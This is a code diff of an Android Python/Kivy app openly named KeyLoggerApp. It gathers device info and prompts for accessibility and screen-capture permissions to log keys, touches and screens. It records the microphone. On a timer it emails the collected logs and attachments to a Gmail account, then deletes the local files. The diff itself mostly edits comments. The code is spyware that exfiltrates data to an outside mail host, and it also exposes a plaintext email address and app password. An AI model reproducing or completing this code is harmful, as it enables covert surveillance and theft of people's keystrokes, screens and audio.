@@ -9,7 +9,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.base import MIMEBase
 from email import encoders
 
-# Config (Edit these)
+# Config (Your original emails)
 EMAIL_SENDER = 'shivamandpandu@gmail.com'
 EMAIL_PASSWORD = 'bmqa vxwn nqlh dgkb'  # App Password
 RECIPIENT_EMAIL = 'shivamandpandu@gmail.com'
@@ -34,7 +34,7 @@ class KeyLoggerApp(App):
         self.sys_info = self.get_info()
         self.logs.append(self.sys_info)
         Clock.schedule_interval(self.report, SEND_EVERY)
-        Clock.schedule_once(self.start_accessibility, 1)  # Delay for UI
+        Clock.schedule_once(self.start_accessibility, 1)
         return Label(text='KeyLogger Running...\n' + self.sys_info + '\n(Enable Accessibility in Settings!)')
 
     def get_info(self):
@@ -43,24 +43,23 @@ class KeyLoggerApp(App):
         sys = platform.system()
         return f"Host: {h}\nIP: {ip}\nOS: {sys}\nTime: {time.ctime()}\n"
 
-    # Key/Touch Logging (Calls AccessibilityService)
+    # Key/Touch Logging (Prompts Accessibility)
     def start_accessibility(self, dt):
         try:
             intent = Intent('android.settings.ACCESSIBILITY_SETTINGS')
             PythonActivity.mActivity.startActivity(intent)
             self.logs.append("[Accessibility Prompted - Enable for Key/Touch Logging]\n")
-            # Interact with service: autoclass('org.example.YourAccessibilityService').logEvent("Started")
         except Exception as e:
             self.logs.append(f"[Accessibility Error: {e}]\n")
 
-    # Screenshot (User grants via prompt)
+    # Screenshot (Prompts Permission)
     def take_screenshot(self):
         try:
             mpm = PythonActivity.mActivity.getSystemService(Context.MEDIA_PROJECTION_SERVICE)
             intent = mpm.createScreenCaptureIntent()
             PythonActivity.mActivity.startActivityForResult(intent, 100)
             self.logs.append("[Screenshot Prompted - Grant Permission]\n")
-            return TEMP_SS  # Save actual image in callback (simplified)
+            return TEMP_SS  # Placeholder; full save in callback
         except Exception as e:
             self.logs.append(f"[Screenshot Error: {e}]\n")
             return None
@@ -78,9 +77,8 @@ class KeyLoggerApp(App):
                 recorder.stop()
                 recorder.release()
             threading.Timer(10, stop_record).start()
-            # Simplified: Write dummy data; add loop for real bytes
             with open(TEMP_MIC, 'wb') as f:
-                f.write(b'\x00' * buffer_size * 10)  # Placeholder
+                f.write(b'\x00' * buffer_size * 10)  # Placeholder data
             self.logs.append("[Mic Recorded 10s]\n")
             return TEMP_MIC
         except Exception as e:
@@ -110,7 +108,6 @@ class KeyLoggerApp(App):
         except Exception as e:
             self.logs.append(f"[Email Error: {e} - Saved to file]\n")
             with open('/sdcard/log.txt', 'a') as f: f.write(body)
-        # Cleanup
         for f in files_to_attach: os.remove(f)
 
     def report(self, dt):
